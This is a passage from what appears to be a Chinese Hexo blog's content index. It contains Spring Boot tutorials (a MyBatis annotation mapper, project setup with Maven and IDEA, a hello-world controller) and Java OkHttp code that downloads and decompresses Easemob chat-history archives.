<span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="keyword">private</span> String imageSrc;</span><br><span class="line">    <span class="keyword">private</span> String manager;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPhone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPhone</span><span class="params">(String phone)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(String email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getImageSrc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> imageSrc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setImageSrc</span><span class="params">(String imageSrc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.imageSrc = imageSrc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> manager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setManager</span><span class="params">(String manager)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.manager = manager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, phone=&#x27;&quot;</span> + phone + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, password=&#x27;&quot;</span> + password + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, email=&#x27;&quot;</span> + email + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, imageSrc=&#x27;&quot;</span> + imageSrc + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, manager=&#x27;&quot;</span> + manager + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>创建UserMapper.java接口，并添加@Mapper注解，使用@Select(“select * from user”)注解方式写查询语句：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.datasource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.tx.datasource.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from user&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">findUser</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>创建Controller类：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.datasource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/findUser&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> List&lt;User&gt; <span class="title">findUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.findUser();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>创建主启动类MyApplication：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.datasource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(MyApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li>到此为止springboot整合MyBatis的注解方式完成，运行主启动类的main函数，访问<a href="http://localhost:8080/findUser可以看到成功查询数据。">http://localhost:8080/findUser可以看到成功查询数据。</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> springboot整合MyBatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springboot应用搭建</title>
      <link href="2021/05/08/springboot%E5%BA%94%E7%94%A8%E6%90%AD%E5%BB%BA/"/>
      <url>2021/05/08/springboot%E5%BA%94%E7%94%A8%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="springboot应用搭建"><a href="#springboot应用搭建" class="headerlink" title="springboot应用搭建"></a>springboot应用搭建</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><div class="note green no-icon flat"><p>jdk1.8：Spring Boot推荐jdk1.8及以上版本；</p><p>Maven3.x：Maven3.3以上版本；</p><p>IntelliJIDEA2019</p><p>SpringBoot2.3.10RELEASE</p><p>SpringBoot内置了Servlet容器：Tomcat9.0   ServletVersion  4.0</p></div><h2 id="Maven配置"><a href="#Maven配置" class="headerlink" title="Maven配置"></a>Maven配置</h2><p>修改Maven的settings.xml文件</p><h3 id="配置Maven镜像提高下载速度"><a href="#配置Maven镜像提高下载速度" class="headerlink" title="配置Maven镜像提高下载速度"></a>配置Maven镜像提高下载速度</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-aliyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus aliyun<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="配置Maven的profiles标签添加profile"><a href="#配置Maven的profiles标签添加profile" class="headerlink" title="配置Maven的profiles标签添加profile"></a>配置Maven的profiles标签添加profile</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="IDEA配置"><a href="#IDEA配置" class="headerlink" title="IDEA配置"></a>IDEA配置</h2><div class="note green no-icon flat"><p>1.配置jdk和Maven仓库路径</p></div><ul><li>点击 Configure —&gt; 选择Structure for New Projects</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/05/11/AWd3FOJIbCy2QYq.png" alt="IDEA配置01.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/05/11/2j9fpcAtGV6YEhw.png" alt="IDEA配置02.png"></p><ul><li>选择Project —&gt; 选择jdk版本为1.8 —&gt; 点击OK</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/05/11/jPDmxTceF36kU78.png" alt="IDEA配置03.png"></p><ul><li>点击Configure  —&gt; 选择Settings</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/05/11/HUu5WdRAVzxkYKN.png" alt="IDEA配置04.png"></p><ul><li>选择Builld Tools下的Maven —&gt; 配置Maven仓库地址 （Maven要大于3.3的） —&gt;点击OK</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/05/11/ALIEPeaNC51Utxq.png" alt="IDEA配置05.png"></p><div class="note green no-icon flat"><p>2.创建Maven管理的项目</p></div><ul><li>点击Create New Project</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/05/11/Dy2boKJwH8FlIEN.png" alt="IDEA配置06.png"></p><ul><li>选择Maven —&gt; 选择SDK大于或等于1.8的 —&gt;点击Next</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/05/11/TpXYQE9ARJ7txKh.png" alt="IDEA配置07.png"></p><ul><li>填写GroupID和Artifactd —&gt; 点击Next</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/05/11/DYk7IvaHZjltyJB.png" alt="IDEA配置08.png"></p><ul><li>填写项目名称和项目地址—&gt;点击Finish</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/05/11/4JUMbdQrykwOC8N.png" alt="IDEA配置09.png"></p><div class="note green no-icon flat"><p>3.第一个springBoot应用</p></div><ul><li><p>在pom.xml文件中导入依赖</p>  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.tx.springboot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tx_sboot<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 该工程下的子工程module --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;modules&gt;</span></span><br><span class="line"><span class="comment">        &lt;module&gt;springboot-first&lt;/module&gt;</span></span><br><span class="line"><span class="comment">        &lt;module&gt;springboot-profile&lt;/module&gt;</span></span><br><span class="line"><span class="comment">        &lt;module&gt;java-spi&lt;/module&gt;</span></span><br><span class="line"><span class="comment">        &lt;module&gt;springboot-datasource&lt;/module&gt;</span></span><br><span class="line"><span class="comment">    &lt;/modules&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置为父工程 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- starter-parent里面管理了springboot所有的starter --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- web服务依赖 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 代码自动提示依赖 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在src/main/java包下创建一个cn.tx.springboot子包，并在这个子包下创建一个TestController.java文件：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.springboot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;访问hello界面！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello springboot!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在cn.tx.springboot包下创建一个启动类FirstSpringApplication.java文件：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.springboot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstSpringApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(FirstSpringApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>现在运行启动类的main函数，访问（<a href="http://localhost:8080/test/hello）便可以看到访问成功界面，如下图所示：">http://localhost:8080/test/hello）便可以看到访问成功界面，如下图所示：</a></p><p>  <img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/07/01/j6JfLFyXKx1EbIa.png" alt="1625124531818.png"></p></li><li><p>可以再resources目录下创建一个application.properties文件，并在文件中配置服务访问的端口号：</p>  <figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">8081</span></span><br></pre></td></tr></table></figure><p>  然后访问（<a href="http://localhost:8081/test/hello），同样可以成功访问。">http://localhost:8081/test/hello），同样可以成功访问。</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> springboot应用搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>环信拉取聊天记录并解析</title>
      <link href="2021/04/26/%E7%8E%AF%E4%BF%A1%E6%8B%89%E5%8F%96%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%B9%B6%E8%A7%A3%E6%9E%90/"/>
      <url>2021/04/26/%E7%8E%AF%E4%BF%A1%E6%8B%89%E5%8F%96%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%B9%B6%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="环信拉取聊天记录并解析"><a href="#环信拉取聊天记录并解析" class="headerlink" title="环信拉取聊天记录并解析"></a>环信拉取聊天记录并解析</h2><p>环信返回的聊天记录文件下载地址下载的文件是.gz格式的压缩文件。如果直接下载的话输出流创建的文件必须是.gz格式压缩文件，否则会乱码。我这里是直接下载、解压、写入内存、读取写入内存的文件、转换字符串、解析json字符串为对象（解析json字符串使用了lombok和GsonFormat插件生成ChatMessageHistory类和DownLoadMessageUrl类）一起完成的。</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*日期格式：yyyyMMddHH</span></span><br><span class="line"><span class="comment">*String date 历史消息日期 列如：&quot;2021042422&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMessage</span><span class="params">(String date)</span></span>&#123;</span><br><span class="line">        OkHttpClient okHttpClient = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">        Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">            .url(<span class="string">&quot;https://a1.easemob.com/#&#123;Orgname&#125;/#&#123;Appname&#125;/chatmessages/&quot;</span>+date)</span><br><span class="line">                .header(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">                .header(<span class="string">&quot;Authorization&quot;</span>,<span class="string">&quot;Bearer #&#123;token&#125;&quot;</span>)</span><br><span class="line">                .get()</span><br><span class="line">                .build();</span><br><span class="line">        okHttpClient.newCall(request).enqueue(<span class="keyword">new</span> Callback() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(Call call, IOException e)</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;onFailure3: &quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                System.out.println(response.protocol() + <span class="string">&quot;:&quot;</span> +response.code() + <span class="string">&quot;: &quot;</span> + response.message());</span><br><span class="line">                Headers headers = response.headers();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; headers.size(); i++) &#123;</span><br><span class="line">                    System.out.println(headers.name(i) + <span class="string">&quot;:&quot;</span> + headers.value(i));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//请求成功，获得json字符串</span></span><br><span class="line">                String messageUrlJson =  response.body().string();</span><br><span class="line">                <span class="comment">//解析json字符串</span></span><br><span class="line">                DownLoadMessageUrl downLoadMessageUrl = JSON.parseObject(messageUrlJson,DownLoadMessageUrl.class);</span><br><span class="line">                System.out.println(<span class="string">&quot;解析后得到的地址：&quot;</span>+downLoadMessageUrl.getData().get(<span class="number">0</span>).getUrl());</span><br><span class="line">                String messageFileUrl = downLoadMessageUrl.getData().get(<span class="number">0</span>).getUrl();</span><br><span class="line">                downLoadFile(messageFileUrl,date);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//下载聊天记录文件.gz并解压</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">downLoadFile</span><span class="params">(String messageFileUrl,String date)</span></span>&#123;</span><br><span class="line">        String sourcedir = <span class="string">&quot;G:\\test\\&quot;</span>+date+<span class="string">&quot;.gz&quot;</span>;</span><br><span class="line"></span><br><span class="line">        OkHttpClient okHttpClient = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">        Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                .url(messageFileUrl)</span><br><span class="line">                .get()</span><br><span class="line">                .build();</span><br><span class="line">        okHttpClient.newCall(request).enqueue(<span class="keyword">new</span> Callback() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(Call call, IOException e)</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;downLoadFile: &quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                System.out.println(response.protocol() + <span class="string">&quot;:&quot;</span> +response.code() + <span class="string">&quot; : &quot;</span> + response.message());</span><br><span class="line">                Headers headers = response.headers();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; headers.size(); i++) &#123;</span><br><span class="line">                    System.out.println(headers.name(i) + <span class="string">&quot;:&quot;</span> + headers.value(i));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//下载并解压.gz文件</span></span><br><span class="line">                unGzipFile(sourcedir,response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//下载并解压.gz文件</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unGzipFile</span><span class="params">(String sourcedir,Response response)</span> </span>&#123;</span><br><span class="line">        String ouputfile = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        InputStream fin = <span class="keyword">null</span>;</span><br><span class="line">        GZIPInputStream gzin = <span class="keyword">null</span>;</span><br><span class="line">        FileOutputStream fout = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//建立gzip压缩文件输入流</span></span><br><span class="line">            fin=response.body().byteStream();</span><br><span class="line">            <span class="comment">//建立gzip解压工作流</span></span><br><span class="line">            gzin = <span class="keyword">new</span> GZIPInputStream(fin);</span><br><span class="line">            <span class="comment">//分割压缩文件存储路径，获得解压后文件的存储路径</span></span><br><span class="line">            ouputfile = sourcedir.substring(<span class="number">0</span>,sourcedir.lastIndexOf(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;解压后的文件路径及名称：&quot;</span>+ouputfile);</span><br><span class="line">            <span class="comment">//建立解压文件输出流</span></span><br><span class="line">            fout = <span class="keyword">new</span> FileOutputStream(ouputfile);</span><br><span class="line">            <span class="keyword">int</span> num;</span><br><span class="line">            <span class="keyword">byte</span>[] buf=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];<span class="comment">//建立缓冲字节数组</span></span><br><span class="line">            <span class="comment">//将解压后的文件流写入文件</span></span><br><span class="line">            <span class="keyword">while</span> ((num = gzin.read(buf,<span class="number">0</span>,buf.length)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                fout.write(buf,<span class="number">0</span>,num);</span><br><span class="line">            